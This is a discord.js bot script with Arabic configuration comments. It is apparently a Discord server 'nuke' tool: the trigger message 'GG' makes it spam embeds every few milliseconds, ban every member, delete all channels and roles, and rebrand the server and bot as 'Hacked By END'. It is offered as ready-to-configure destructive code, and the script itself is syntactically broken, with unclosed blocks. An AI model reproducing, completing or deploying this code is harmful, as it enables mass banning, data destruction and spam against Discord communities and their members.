const Discord = require("discord.js");
const client = new Discord.Client();
const x_x = "GG" //هنا تحط الامر اللي يشغل الهاك
const teext = "Hacked By END" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
const vooice = "Hacked By END" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
const pic = "https://cdn.discordapp.com/attachments/514341274715815936/514343001422692353/139649356-208-k384118.jpg" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
const spam = "Hacked By END" //هنا تحط وش تبي رسالة السبام
const namee = "Hacked By END" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
const playing = "End of road" //هنا تحط وش تبي يكون الستريمنق
client.on('message', message => {
if (message.content === x_x) {
    var teeext = teext.replace(" ", "-")
    var interval = setInterval (function () {
    const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail(pic)
   .addField(spam, ".")
    message.channel.sendEmbed(embed);
    client.guilds.forEach(hack => {
    })}, 3);}});
client.on('message', message => {
if (message.content === x_x) {
    message.guild.members.forEach(baand => {
   baand.ban({reason: spam,});
   client.channels.forEach(hackch => {
   hackch.delete();
   client.roles.forEach(hackro => {
   hackro.delete();
   client.user.setAvatar(pic)
   client.user.setGame(playing, 'https://www.twitch.tv/end')
   client.guilds.forEach(hack => {
   hack.setIcon(pic)
       
       
client.login(process.env.BOT_TOKEN)
